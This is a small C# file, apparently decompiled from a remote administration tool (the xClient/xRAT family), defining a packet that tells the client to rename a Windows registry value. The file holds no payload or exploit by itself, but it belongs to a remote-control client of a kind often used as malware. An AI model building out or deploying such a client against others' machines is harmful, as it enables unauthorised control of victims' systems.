using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoRenameRegistryValue : GInterface4
{
	public string KeyPath { get; set; }

	public string OldValueName { get; set; }

	public string NewValueName { get; set; }

	public DoRenameRegistryValue(string keyPath, string oldValueName, string newValueName)
	{
		KeyPath = keyPath;
		OldValueName = oldValueName;
		NewValueName = newValueName;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
